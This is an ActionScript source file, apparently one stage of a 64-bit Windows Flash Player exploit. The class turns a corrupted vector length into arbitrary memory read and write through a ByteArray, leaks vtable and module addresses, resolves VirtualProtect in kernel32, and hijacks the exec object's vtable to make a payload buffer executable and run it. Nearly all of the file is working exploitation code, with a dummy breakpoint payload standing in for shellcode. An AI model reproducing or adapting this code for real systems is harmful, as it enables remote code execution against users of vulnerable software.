package 
{
	import flash.utils.ByteArray
	
	public class Exploiter64 
	{
		private var BYTE_ARRAY_SIZE:Number = 0x3f8
		private var SEARCH_LIMIT:Number = 0x280000 / 4
		private const MAX_STRING_LENGTH:uint = 100
		
		private var defrag:Vector.<Object> = new Vector.<Object>(750)
		
		private var payload_space:Vector.<uint> = new Vector.<uint>()
		private var ov:Vector.<Object> = new Vector.<Object>(2048)
		private var uv:Vector.<uint>
		private var uv_orig_length:uint
		
		private var ba_pos:uint
		private var ba_orig_array:Address64
		private var ba_orig_length:uint
		private var ba_orig_capacity:uint
		private var ba:ByteArray
		
		// Addresses
		private var uv_addr:Address64
		private var vector_object_addr:Address64
		private var this_addr:Address64
		private var payload_space_object:Address64
		private var payload_space_data:Address64
		private var flash_ptr:Address64
		private var vp_addr:Address64
		private var magic:Address64
		private var vtable:Address64
		private var traits:Address64
		private var core:Address64
		private var exec:Address64
		private var exec_vtable: Address64
			
		public function Exploiter64(corrupted_vector, original_length) 
		{
			uv_orig_length = original_length
			uv = corrupted_vector
			uv[0] = 0xdaadbaaf
			
			Logger.log("[*] uv corrupted length: " + uv.length.toString(16))
			
			for (var i:uint = 0; i < defrag.length; i++) {
				defrag[i] = new Vector.<uint>(250)
			}
			
            for (var i:uint = 0; i < ov.length; i++) {
				if (i % 2 == 0) {
					ov[i] = new ByteArray()
					ov[i].length = 0x3f8
					ov[i].position = 0
					ov[i].endian = "littleEndian"
					ov[i].writeUnsignedInt(0xdeedbeef)
				} else {
					ov[i] = new Vector.<Object>(0x3f6)
					ov[i][0] = this
					ov[i][1] = payload_space
					ov[i][2] = Magic
				}
			}
			
			Logger.log('[*] Searching ByteArray')
			try {
				search_byte_array()
			} catch (err:Error) {
				Logger.log('[!] ba not found')
				return
			}
			
			Logger.log("[*] Setting up new ba length")
			set_ba_length(0x1000)
            
			Logger.log("[*] Finding the BA from ov")
            for (i = 0; i < ov.length; i++) {
				if (ov[i].length == 0x1000) {
					ba = ov[i] as ByteArray
					ba.position = 0
					break
				}
			}
			
			if (ba == null) {
				Logger.log('[!] modified ba not found')
				return
			}
			
			Logger.log('[*] ba found at :' + ba_orig_array.toString())
			
			
			Logger.alert('[*] Find uv data addr...')
			uv_addr = new Address64(ba_orig_array.lo, ba_orig_array.hi)
			var leak:uint
			i = 0
			while (true) {
				leak = ba_read(uv_addr)
				if (leak == 0xdaadbaaf) {
					uv_addr.lo = uv_addr.lo - 0x10 // points to uv length
					break
				}
				uv_addr.lo = uv_addr.lo - 4
			}
			
			Logger.log("[*] uv data found at " + uv_addr)
			
			// Make space for the payload / fake objects
			payload_space.length = 0x6400
			
			Logger.log('[*] Leak addresses')
			
			vector_object_addr = new Address64(ba_orig_array.lo, ba_orig_array.hi)
			leak = 0
			i = 0
			while (true) {
				leak = ba_read(vector_object_addr)
				if (leak == 0x3f6) {
					Logger.log('[*] Vector.<Object> found at ' + vector_object_addr.toString()) 
					break
				}
				vector_object_addr.lo = vector_object_addr.lo + 4
			}
			
			this_addr = ba_read_addr(vector_object_addr.offset(8))
			this_addr.lo = this_addr.lo - 1
			Logger.log("[*] 'this' found at " + this_addr.toString())
			
			payload_space_object = ba_read_addr(vector_object_addr.offset(16))
			payload_space_object.lo = payload_space_object.lo - 1
			Logger.log("[*] payload_space_object found at " + payload_space_object.toString())
			
			payload_space_data = ba_read_addr(payload_space_object.offset(0x30))
			payload_space_data.lo = payload_space_data.lo + 0x10
			Logger.log("[*] payload_space_data found at " + payload_space_data.toString())
			
			magic = ba_read_addr(vector_object_addr.offset(24))
			magic.lo = magic.lo - 1
			Logger.log("[*] magic found at " + magic.toString())
													
			vtable = ba_read_addr(magic.offset(0x10))
			Logger.log("[*] vtable found at " + vtable.toString())
			traits = ba_read_addr(vtable.offset(0x28))
			Logger.log("[*] traits found at " + traits.toString())
			core = ba_read_addr(traits.offset(0x8))
			Logger.log("[*] core found at " + core.toString())
			exec = ba_read_addr(core.offset(0x108))
			Logger.log("[*] exec found at " + exec.toString())
			exec_vtable = ba_read_addr(exec)
			Logger.log("[*] exec_vtable found at " + exec_vtable.toString())
			
			/* Leak flash and VirtualProtect */
			flash_ptr = ba_read_addr(this_addr)
			Logger.log("[*] Flash ptr to " + flash_ptr.toString())
			var pe:PE64 = new PE64(this)
			var flash:Address64 = pe.base(flash_ptr)
			Logger.log("[*] Flash base " + flash.toString())
			var winmm:Address64 = pe.module('winmm.dll', flash)
			Logger.log("[*] winmm base " + winmm.toString())
			var kernel32:Address64 = pe.module('kernel32.dll', winmm)
			Logger.log("[*] kernel32 base " + kernel32.toString())
			var virtualprotect:Address64 = pe.procedure("VirtualProtect", kernel32)
			Logger.log("[*] virtualprotect: " + virtualprotect.toString())
			
			
			// Copy the exec object to payload_space
			
			/* 8 bytes before the exec objec to survive the next call:
			 * .text:0000000180896903 mov     rax, [r9+108h]
			 * .text:000000018089690A test    rax, rax
			 * .text:000000018089690D jz      short loc_180
			 * .text:000000018089690F lea     rcx, [rax-8]
			 * .text:0000000180896913 jmp     short loc_180896917
			 * .text:0000000180896917 loc_180896917:
			 * .text:0000000180896917 mov     r9, [rbx+18h]
			 * .text:000000018089691B mov     rax, [rcx]      ; rcx => it's magic :? it shouldn't be corrupted so why????
			 * .text:000000018089691E mov     r8, [r9+8]
			 * .text:0000000180896922 mov     r9, [r9+10h]
			 * .text:0000000180896926 mov     r8, [r8+8]
			 * .text:000000018089692A call    qword ptr [rax+10h]
			 */
			for (var j:int = -2; j < 0x140; j++) {
				payload_space[j + 2] = ba_read(exec.offset(j * 4))
			}
			
			// Copy the exec_vtable to payload_space
			for (i = 0x142; i < 0x142 + (228 / 4); i++) {
				payload_space[i] = ba_read(exec_vtable.offset((i - 0x142) * 4))
			}
			
			// Tweak fake "apply()" vtable entry
			ba_write_addr(payload_space_data.offset(0x508 + 0x30), virtualprotect)
			
			// Link fake exec to fake exec vtable
			ba_write_addr(payload_space_data.offset(8), payload_space_data.offset(0x508))
			
			// Install our fake "exec" object
			ba_write_addr(core.offset(0x108), payload_space_data.offset(8))
			
			// Install our fake "arg1"
			var arg1:Address64 = ba_read_addr(magic.offset(0x38))
			ba_write_addr(magic.offset(0x38), new Address64(payload_space.length * 4, 0))
			
			// Install our fake "arg2"
			var arg2:Address64 = ba_read_addr(magic.offset(0x40))
			ba_write_addr(magic.offset(0x40), new Address64(0x40, 0))
			
			// Arg0
			var args:Array = new Array(4) // Should be good enough to control arg0
			
			Logger.log('[*] Execte VirtualProtect')
			
			Magic.apply(null, args)
			
			ba_write_addr(magic.offset(0x38), arg1)
			ba_write_addr(magic.offset(0x40), arg2)
			ba_write_addr(core.offset(0x108), exec)
			
			Logger.log("Looks good:\n" +
				"                   'this' addr: " + this_addr.toString() + "\n" +
				"     payload_space_object addr: " + payload_space_object.toString() + "\n" +
				"       payload_space_data addr: " + payload_space_data.toString() + "\n" +
				"                    magic addr: " + magic.toString() + "\n")
			
			for (i = 0; i < 504; i++) {
				payload_space[i] = 0
			}
			
			for (i = 0; i < 228 / 4; i++) {
				payload_space[i] = ba_read(exec_vtable.offset(i * 4))
			}
			
			payload_space[500] = 0xcccccccc
			payload_space[501] = 0xcccccccc
			
			ba_write_addr(payload_space_data.offset(0x30), payload_space_data.offset(500 * 4))
			ba_write_addr(exec, payload_space_data)
			
			Logger.log('Execute dummy payload')
			Magic.apply(null, args)
			
			// To restore uv... TODO:incomplete
			ba_write(uv_addr, uv_orig_length)
		}
		
		static function Magic(...a){}
		
		// Make ba_pos point to the *array ptr
		private function search_byte_array():void {
			var hi, lo:uint
			for (var i:uint = 0; i < SEARCH_LIMIT; i++) {
                if (uv[i + 2] == 0x3f8 && uv[i + 3] == 0x3f8) {
					ba_orig_capacity = 0x3f8
					ba_orig_length = 0x3f8
					lo = uv[i]
					hi = uv[i + 1]
					ba_orig_array = new Address64(lo, hi)
                    ba_pos = i
					return
                }
            }
			
            throw new Error() 
		}
		
		private function set_ba_length(new_length:uint):void {
			uv[ba_pos + 2] = new_length
			uv[ba_pos + 3] = new_length
		}
		
		private function set_ba_array(ptr:Address64):void {
			uv[ba_pos] = ptr.lo
			uv[ba_pos + 1] = ptr.hi
		}
		
		private function restore_ba():void {
			set_ba_array(ba_orig_array)
			set_ba_length(0x3f8)
		}
		
		public function ba_read(addr:Address64):uint {
			set_ba_array(addr)
			ba.position = 0
			return ba.readUnsignedInt()
		}
		
		public function ba_read_word(addr:Address64):uint {
			set_ba_array(addr)
			ba.position = 0
			return ba.readUnsignedShort()
		}
		
		public function ba_write(addr:Address64, val:uint):void {
			set_ba_array(addr)
			ba.position = 0
			ba.writeUnsignedInt(val)
		}
		
		public function ba_read_addr(addr:Address64):Address64 {
			var hi, lo:uint
			
			set_ba_array(addr)
			ba.position = 0
			lo = ba.readUnsignedInt()
			hi = ba.readUnsignedInt()
			return new Address64(lo, hi)
		}
		
		public function ba_write_addr(addr:Address64, val:Address64):void {
			set_ba_array(addr)
			ba.position = 0
			ba.writeUnsignedInt(val.lo)
			ba.writeUnsignedInt(val.hi)
		}
		
		public function read_string(addr:Address64, length:uint = 0):String
        {
			set_ba_array(addr)
			ba.position = 0
            if (length == 0)
                return ba.readUTFBytes(MAX_STRING_LENGTH)
            else
                return ba.readUTFBytes(length) 
        }
	}

}